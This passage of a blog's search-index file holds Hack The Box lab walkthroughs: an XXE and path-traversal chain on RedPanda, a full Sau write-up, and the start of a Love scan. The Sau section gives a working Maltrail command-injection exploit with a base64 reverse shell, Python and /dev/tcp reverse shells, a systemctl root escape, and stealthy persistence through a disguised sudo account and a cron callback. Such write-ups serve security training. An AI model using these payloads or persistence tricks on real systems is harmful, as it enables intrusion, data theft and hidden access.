parsed_data.get(\u0026#34;uri\u0026#34;).toString()); } } The main method ties everything together: Reads the log file line by line: +Important+: This is the log file our user has write privileges over so we may be able to inject malicious code by placing it in this file and having it execute. Skips non-image entries Parses each log line Extracts the artist from the image metadata Updates view counts in the corresponding artist\u0026rsquo;s XML credit file +Important+: As the program parses XML data as one of it\u0026rsquo;s functions we may be able to perform and XXE (XML External Entity Attack) Simply Explained: Overall, this application appears to be a log parser for the photo viewing application that runs.\nProcesses logs of image views Extracts artist information from image metadata Maintains view counts per image and artist in XML files Specifically tracks JPG images viewed through the web interface Why The Code Is Vulnerable: The code contains multiple critical vulnerabilities that chain together. Let\u0026rsquo;s me explain the key vulnerable components:\nVulnerable Log Parsing: public static Map parseLog(String line) { // VULNERABILITY: No input validation String[] strings = line.split(\u0026#34;\\\\|\\\\|\u0026#34;); Map map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;status_code\u0026#34;, Integer.parseInt(strings[0])); map.put(\u0026#34;ip\u0026#34;, strings[1]); map.put(\u0026#34;user_agent\u0026#34;, strings[2]); map.put(\u0026#34;uri\u0026#34;, strings[3]); return map; } Accepts log entries without validation Expects format: status_code||ip||user_agent||uri Example: 200||192.168.1.1||Mozilla/5.0||/images/cat.jpg Can be manipulated to inject malicious URIs Weak Image Validation: public static boolean isImage(String filename) { // VULNERABILITY: Basic string check only if(filename.contains(\u0026#34;.jpg\u0026#34;)) { return true; } return false; } Only checks for \u0026ldquo;.jpg\u0026rdquo; substring Can be bypassed with: Path traversal: ../../../something.jpg Double extensions: malicious.php.jpg Unsafe Artist Metadata Extraction: public static String getArtist(String uri) throws IOException, JpegProcessingException { // VULNERABILITY: Direct path concatenation String fullpath = \u0026#34;/opt/panda_search/src/main/resources/static\u0026#34; + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); // VULNERABILITY: No validation on metadata for(Directory dir : metadata.getDirectories()) { for(Tag tag : dir.getTags()) { if(tag.getTagName() == \u0026#34;Artist\u0026#34;) { return tag.getDescription(); } } } return \u0026#34;N/A\u0026#34;; } Direct URI concatenation enables path traversal No validation of metadata values Artist tag used in file paths without sanitization Vulnerable XML Processing: public static void addViewTo(String path, String uri) throws JDOMException, IOException { // VULNERABILITY: XXE possible - external entities enabled SAXBuilder saxBuilder = new SAXBuilder(); // VULNERABILITY: Path traversal via artist name String xmlPath = \u0026#34;/credits/\u0026#34; + artist + \u0026#34;_creds.xml\u0026#34;; // ... XML processing ... } XML parser allows external entities (XXE) Direct path concatenation with artist name No path sanitization Why These Vulnerabilities Matter: Path Traversal Chain:\nAttacker can craft JPEG with malicious artist metadata Example: ../tmp/bloodstiller as artist name Results in path: /credits/../tmp/bloodstiller_creds.xml XXE Attack Chain:\nCreate malicious XML in predicted location XML contains external entity references Processed as root due to cron job Can read sensitive files like /root/.ssh/id_rsa Root Privilege Exploitation:\nApplication runs as root via cron Processes untrusted input No security controls Predictable file paths The vulnerabilities chain together because:\nWe can control the artist metadata in JPEGs This metadata is used in file paths without sanitization The XML parser processes external entities Everything runs with root privileges XXE Primer: What is XML External Entity Processing? Portswigger have a great explanation here .\nBrief Overview:\nXXE attacks involve exploiting vulnerable XML processors by injecting malicious XML content. Attackers can leverage this to access sensitive data, execute remote requests, or cause denial of service. Common XXE Attacks:\nData Breach Access to filesystem: Reading files, directory structures. (This is what we will do) Remote Code Execution In severe cases, lead to executing arbitrary code on the server. Denial of Service (DoS) Consuming server resources by referencing large or recursive entities. Exploitation: Overview of Attack Chain: Create malicious JPEG with crafted Artist metadata Place malicious XML file in predictable location Trigger log processing via web request Wait for root cron job to process our malicious files Extract sensitive data via XXE Step 1: Crafting Malicious JPEG: Download sample image for modification: Verify current metadata state:\nexiftool Cat.jpg exiftool -Artist [image][.jpg] No existing Artist tag found Inject path traversal payload into Artist metadata:\nexiftool -Artist=\u0026#39;../tmp/bloodstiller\u0026#39; Cat.jpg This creates path: /credits/../tmp/bloodstiller_creds.xml Uses directory traversal to escape /credits/ directory Step 2: Creating Malicious XML: Download the template from web application that we discovered earlier.\nwget http://$box:8080/export.xml Modify XML to include XXE payload:\nAt the moment I am using a POC to read /etc/passwd I am doing this as this a world readable file by any user and will provide us proof that we can trigger RCE via XXE. Defines external entity that reads /etc/passwd Maintains original XML structure Adds payload in predictable location Place XML file in target location:\nwget http://10.10.14.29:9000/export.xml -O /tmp/bloodstiller_creds.xml Step 3: Triggering Exploitation: Trigger log entry creation via web request:\ncurl -A \u0026#34;bloodstiller||/../../../../../../../../../../tmp/Cat.jpg\u0026#34; http://$box:8080/ Uses User-Agent header to inject log entry Path traversal in URI points to our malicious JPEG Verify log entry creation:\ntail -f /opt/panda_search/redpanda.log Verify it worked:\ncat /tmp/bloodstiller_creds.xml As we can see it now contains the contents of /etc/passwd verifying proof the POC works. Now to move onto exploitation. Step 4: Privilege Escalation via XXE: Modify XML to target SSH private key:\nWait for cron job execution (runs every 2 minutes)\nExtract private key from XML output:\ncat /tmp/bloodstiller_creds.xml Set proper permissions on extracted key:\nchmod 600 id_rsa Login as root:\nssh -i id_rsa root@$box Retrieve root flag:\n5. Persistence: I already have a root ssh key \u0026amp; my brain is melted from the Java attack chain, so I am going to leave it at that. Lessons Learned: What did I learn? This was really hard for me. I know nothing about java and breaking down the code \u0026amp; getting my head round it took a long time. Got there but this should not be an \u0026ldquo;Easy\u0026rdquo; box it\u0026rsquo;s medium at the least. I learned so much about breaking down java and also chaining attacks. What silly mistakes did I make? Too numerous to list but was trying my best. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/redpanda-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cve-2023-26604\/": {
        "title": "CVE-2023-26604",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cve-2023-26604\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cve-202327163\/": {
        "title": "CVE-2023–27163",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cve-202327163\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/sau-box\/": {
        "title": "Sau HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Linux","CVE-2023–27163","CVE-2023-26604","SSRF","systemctl",],
        "content": "Sau Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Sau How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -oA TCPbasicScan kali in HTB/BlogEntriesMade/Sau/scans/nmap 🍣 main 1Gweb/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 17:04:11 zsh ❯ nmap $box -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 17:04 GMT Nmap scan report for 10.129.80.109 Host is up (0.044s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp filtered http 55555/tcp open unknown Initial thoughts: SSH, Web \u0026amp; a strange service on 55555 Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP ali in HTB/BlogEntriesMade/Sau/scans/nmap 🍣 main 1Gweb/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 17:05:49 zsh ✖ sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 17:06 GMT Nmap scan report for 10.129.80.109 Host is up (0.038s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA) | 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA) |_ 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519) 80/tcp filtered http 8338/tcp filtered unknown 55555/tcp open unknown | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 400 Bad Request | Content-Type: text/plain; charset=utf-8 | X-Content-Type-Options: nosniff | Date: Tue, 24 Dec 2024 17:06:57 GMT | Content-Length: 75 | invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$ | GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 302 Found | Content-Type: text/html; charset=utf-8 | Location: /Web | Date: Tue, 24 Dec 2024 17:06:31 GMT | Content-Length: 27 | href=\u0026#34;/Web\u0026#34;\u0026gt;Found\u0026lt;/a\u0026gt;. | HTTPOptions: | HTTP/1.0 200 OK | Allow: GET, OPTIONS | Date: Tue, 24 Dec 2024 17:06:32 GMT |_ Content-Length: 0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port55555-TCP:V=7.94SVN%I=7%D=12/24%Time=676AEA16%P=x86_64-pc-linux-gnu SF:%r(GetRequest,A2,\u0026#34;HTTP/1\\.0\\x20302\\x20Found\\r\\nContent-Type:\\x20text/ht SF:ml;\\x20charset=utf-8\\r\\nLocation:\\x20/Web\\r\\nDate:\\x20Tue,\\x2024\\x20Dec SF:\\x202024\\x2017:06:31\\x20GMT\\r\\nContent-Length:\\x2027\\r\\n\\r\\n\u0026lt;a\\x20href= SF:\\\u0026#34;/Web\\\u0026#34;\u0026gt;Found\u0026lt;/a\u0026gt;\\.\\n\\n\u0026#34;)%r(GenericLines,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x SF:20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnectio SF:n:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(HTTPOptions,60,\u0026#34;HTTP/1\\.0\\ SF:x20200\\x20OK\\r\\nAllow:\\x20GET,\\x20OPTIONS\\r\\nDate:\\x20Tue,\\x2024\\x20Dec SF:\\x202024\\x2017:06:32\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(RTSPReq SF:uest,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/pl SF:ain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Requ SF:est\u0026#34;)%r(Help,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x2 SF:0text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad SF:\\x20Request\u0026#34;)%r(SSLSessionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\ SF:nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TerminalServerCookie,67,\u0026#34;HTTP/1\\.1\\x20 SF:400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\ SF:r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TLSSessionReq, SF:67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\ SF:x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;) SF:%r(Kerberos,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\ SF:x20Request\u0026#34;)%r(FourOhFourRequest,EA,\u0026#34;HTTP/1\\.0\\x20400\\x20Bad\\x20Request SF:\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-Type-Opt SF:ions:\\x20nosniff\\r\\nDate:\\x20Tue,\\x2024\\x20Dec\\x202024\\x2017:06:57\\x20G SF:MT\\r\\nContent-Length:\\x2075\\r\\n\\r\\ninvalid\\x20basket\\x20name;\\x20the\\x2 SF:0name\\x20does\\x20not\\x20match\\x20pattern:\\x20\\^\\[\\\\w\\\\d\\\\-_\\\\\\.\\]{1,250 SF:}\\$\\n\u0026#34;)%r(LPDString,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-T SF:ype:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400 SF:\\x20Bad\\x20Request\u0026#34;)%r(LDAPSearchReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Req SF:uest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x2 SF:0close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;); Device type: general purpose Running: Linux 5.X OS CPE: cpe:/o:linux:linux_kernel:5.0 OS details: Linux 5.0 Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 114.86 seconds Findings: So it\u0026rsquo;s running Ubuntu, there is also a Webserver running 55555 SSH 22: Even though SSH is running it\u0026rsquo;s often not worth trying bruteforce due to how slow it is so I will come back to this later. Web 80: Web Enumeration via Burp Suite: When enumerating a Website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. WhatWeb: Lets run \u0026ldquo;whatWeb\u0026rdquo; to see if I can glean some further information:\nwhatWeb http://$box | sed 's/, /\\n/g' +Note+: I use sed to put the output across multiple lines for a nicer output. It fails. It looks to me like this can\u0026rsquo;t be accessed yet. Service 55555: WhatWeb: Lets run \u0026ldquo;whatWeb\u0026rdquo; to see if I can glean some further information: whatWeb http://$box:55555 | sed 's/, /\\n/g' Manually Visiting the page: When visiting the page I can see it\u0026rsquo;s for a service called request-baskets.\nLooking at the repo for the project I can see its a \u0026ldquo;HTTP requests collector to test Webhooks, notifications, REST clients and more …\u0026rdquo; Creating a basket:\nI create a basket. I am issued with a token: When I open the basket I am treated to this page:\nClicking the clog in the top right it reveals I can forward our requests to a url of our choosing.\nI stand-up a python server:\npython -m http.server 9000 I put the URL into the box as Ill as /POC.\nI save \u0026ldquo;Apply\u0026rdquo; it. I make a request with the supplied url: http://10.129.80.109:55555/xk7ox7n I immediately get a hit on Webserver.\nDiscovering The Host Is Vulnerable To SSRF CVE-2023-27163: Lets see if I can access the service running on port 80 of the machine, that I could not access before.\nI change the forward url to http://127.0.0.1:80 I visit the page but nothing happens.\nI then enable the below options:\nWhen I go now I get the following page:\nlooking it appears to be a service called \u0026ldquo;MalTrail\u0026rdquo; and it\u0026rsquo;s version 0.53 2. Foothold: Getting A Reverse Shell Using CVE-2023-27163 Exploit: I find this exploit for the software MailTrail v 0.53 - https://github.com/spookier/Maltrail-v0.53-Exploit it takes advantage of this command injection RCE\nhttps://www.rapid7.com/db/modules/exploit/unix/http/maltrail_rce/ CVE-2023–27163. The username parameter is vulnerable to an injection attack. The POC exploit is below.\n+Note+: I have added comments to it to explain what is happening. import sys; # import system to take CLI args. import os; # import OS to directly interact wtih the operating system. import base64; # import base64 for encoding payload. # Declare Main Function/Logic def main(): # Declare variables listening_IP = None listening_PORT = None target_URL = None # Simple if statement that checks if all CLI args are provided, if not it errors our and prints a message. if len(sys.argv) != 4: print(\u0026#34;Error. Needs listening IP, PORT and target URL.\u0026#34;) return(-1) # Takes the CLI args from the user (appends \u0026#34;/login\u0026#34; to the target url) listening_IP = sys.argv[1] listening_PORT = sys.argv[2] target_URL = sys.argv[3] + \u0026#34;/login\u0026#34; # Prints a message stating that the exploit is running. print(\u0026#34;Running exploit on \u0026#34; + str(target_URL)) # Runs the curl_cmd function with the provided user variables. curl_cmd(listening_IP, listening_PORT, target_URL) # Define the curl_cmd function, which takes 3 arguments. The users IP, the PORT \u0026amp; the target_url. def curl_cmd(my_ip, my_port, target_url): # Define the payload. # This is a simple python reverse shell, which imports socket, os \u0026amp; pty. # It takes the user provided args listening_IP \u0026amp; listening_PORT and they are passed as my_ip, my_port as f-string args payload = f\u0026#39;python3 -c \\\u0026#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;{my_ip}\u0026#34;,{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/sh\u0026#34;)\\\u0026#39;\u0026#39; # It encodes the payload in base64 format. encoded_payload = base64.b64encode(payload.encode()).decode() # encode the payload in Base64 # It runs a curl command, and passes the data via the `username` parameter where it echoes out the payload, base64 decrypts it and then passes it for a subshell for execution. command = f\u0026#34;curl \u0026#39;{target_url}\u0026#39; --data \u0026#39;username=;`echo+\\\u0026#34;{encoded_payload}\\\u0026#34;+|+base64+-d+|+sh`\u0026#39;\u0026#34; os.system(command) if __name__ == \u0026#34;__main__\u0026#34;: main() I start my local listener.\nrlwrap -cAr nc -nvlp 4433 I run the exploit and get a shell.\nLets get the user flag:\nNow that I have a shell, I will upgrade it so I can have more functionality.\npython3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' I check what commands I can run with sudo privileges and there is a service, trail.service I can run with sudo privileges.\n3. Privilege Escalation: Side-quest/rabbit hole: +Note+: This was a little side quest that I have left in for transparency.\nReading the service file I can see it runs the server.py file which is in the /opt/maltrail folder. Which means if I can edit this file or if I can change the file it executes.\nI tried a lot of ways to get vim working, however no matter how I upgraded my shell it would not work. Luckily I can use built in tools such as sed to replace content within the files.\n# Command: sed -i \u0026#39;s/[ReplaceThisContent]/[WithThisContent]/\u0026#39; [File] It\u0026rsquo;s as simple as that, it\u0026rsquo;s much like find and replace within vim. E.G. I can pass flags such as g to perform global replacements in the entire file. Let\u0026rsquo;s create a python reverse shell in our home dir.\necho \u0026#39;import os,pty,socket;s=socket.socket();s.connect((\u0026#34;10.10.14.18\u0026#34;,4242));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; \u0026gt;\u0026gt; ~/shell.py I can now use sed to modify the trail.service to point at our new reverse shell.\nsed -i \u0026#34;s/ExecStart=\\/usr\\/bin\\/python3\\ server.py/ExecStart=\\/usr\\/bin\\/python3\\ \\/home\\/puma\\/shell.py/g\u0026#34; trail.service Ill that did not work as I cannot write to the file.\nDiscovering The Host Is Vulnerable To CVE-2023-26604: I put linpeas on the host but do not find anything of note.\nAs this is a box/ctf I can\u0026rsquo;t help but think that the service I can execute as root does have something to do with the privesc path.\nI check the version of systemctl running:\nsystemctl --version I can see it\u0026rsquo;s version: systemd 245 (245.4-4ubuntu3.22) I search for the phrase \u0026ldquo;systemd 245 (245.4-4ubuntu3.22) privesc\u0026rdquo; and find the following page: https://packetstorm.news/files/id/174130 .\nReading the article it appears that when I request the status of a service e.g:\nsudo systemctl status [service] It will open the output in a pager, which allows us to execute additional commands and as this is running in the context of the root user if I type !/bin/sh I can launch a root shell. +Note+: It is also possible to run other commands but for the purpose of this we want RCE in the context of the root user. Getting A Reverse Shell Using CVE-2023-26604: I view the output of the trail.service as I can run that in the context of root. sudo systemctl status trail.service With this open I can now run !/bin/sh to launch the root terminal. I get the root flag: 4. Persistence: Now that I have root access I would like to retain it so I will demonstrate two simple persistence techniques. Creating a high privileged \u0026ldquo;service\u0026rdquo; account for persistence: I create an account called \u0026ldquo;nginx\u0026rdquo; and give myself root privileges \u0026amp; access to the bash shell. I use this name as it\u0026rsquo;s one you could see on a machine and will raise less suspicion.\nsudo useradd -m -s /bin/bash nginx\nCreates a new user named nginx. -m: Creates a home directory for the user. -s /bin/bash: Sets the user\u0026rsquo;s default shell to /bin/bash. sudo usermod -aG sudo nginx\nAdds the nginx user to the sudo group. -a: Appends the user to the group (avoids overwriting existing groups). -G sudo: Specifies the sudo group. sudo passwd nginx\nSets or updates the password for the nginx user. Prompts us to add a new password and confirms it. I switch to the newly created user\nI check I have sudo privileges, as expected I do.\nI ensure I can actually read sudo level files by reading /etc/shadow\nCreating a cron job reverse shell: (crontab -l \u0026gt; .tab ; echo \u0026#34;* * * * * /bin/bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.18/443 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt;\u0026gt; .tab ; crontab .tab ; rm .tab) \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 Let\u0026rsquo;s verify it\u0026rsquo;s in the crontab by running crontab -l\nAs I can see it\u0026rsquo;s running. I start my listener and get a connection back after 1 minute.\n+Note+: This is great as a means to call back out to our attack machine, however an interval of every 1 minute is excessive, it would typically be better to set it at longer intervals to re-connect.\nLessons Learned: What did I learn? I actually learned about the systemctl CVE, I was not aware of that before. This box helped me cement more SSRF learning, I have been grinding some SSRF/Web boxes recently to get better at them. What silly mistakes did I make? Nothing of note this time, which is nice. Sign off: Remember, folks as always: with great poIr comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/sau-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/ssrf\/": {
        "title": "SSRF",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/ssrf\/"
    },
    
    "http:\/\/localhost:1313\/tags\/systemctl\/": {
        "title": "Systemctl",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/systemctl\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/love-box\/": {
        "title": "Love HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Windows","Active Directory","SSRF","ScheduledTask","msi",],
        "content": "Love Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Love How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan 🕙 06:05:33 zsh ❯ nmap $box -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 06:05 GMT Nmap scan report for 10.129.48.103 Host is up (0.043s latency). Not shown: 993 closed tcp ports (reset) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql 5000/tcp open upnp Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds Initial thoughts: HTTP/HTTPs SMB MYSQL Interestingly a service on 5000 Comprehensive Scans: In depth scan TCP: sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP ali in HTB/BlogEntriesMade/Love/scans/nmap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 06:05:37 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 06:06 GMT Nmap scan report for 10.129.48.103 Host is up (0.036s latency). Not shown: 65516 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: Voting System using PHP | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in | Not valid before: 2021-01-18T14:00:16 |_Not valid after: 2022-01-18T14:00:16 |_http-title: 403 Forbidden 445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql? | fingerprint-strings: | JavaRMI, Kerberos, LANDesk-RC, NotesRPC, RPCCheck, SSLSessionReq, TerminalServer, TerminalServerCookie, X11Probe, ms-sql-s: |_ Host \u0026#39;10.10.14.80\u0026#39; is not allowed to connect to this MariaDB server 5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-title: 403 Forbidden |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 5040/tcp open unknown 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_ssl-date: 2024-12-23T07:32:38+00:00; +1h21m34s from scanner time. | ssl-cert: Subject: commonName=LOVE | Subject Alternative Name: DNS:LOVE, DNS:Love | Not valid before: 2021-04-11T14:39:19 |_Not valid after: 2024-04-10T14:39:19 | tls-alpn: |_ http/1.1 |_http-server-header: Microsoft-HTTPAPI/2.0 7680/tcp open pando-pub? 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.94SVN%I=7%D=12/23%Time=6768FE45%P=x86_64-pc-linux-gnu% SF:r(RPCCheck,4A,\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.80\u0026#39;\\x20is\\x20not\\ SF:x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(SSLS SF:essionReq,4A,\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.80\u0026#39;\\x20is\\x20not\\x SF:20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(Termi SF:nalServerCookie,4A,\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.80\u0026#39;\\x20is\\x2 SF:0not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r SF:(Kerberos,4A,\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.80\u0026#39;\\x20is\\x20not\\x SF:20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(X11Pr SF:obe,4A,\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.80\u0026#39;\\x20is\\x20not\\x20allo SF:wed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(LANDesk-RC, SF:4A,\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.80\u0026#39;\\x20is\\x20not\\x20allowed\\ SF:x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(TerminalServer, 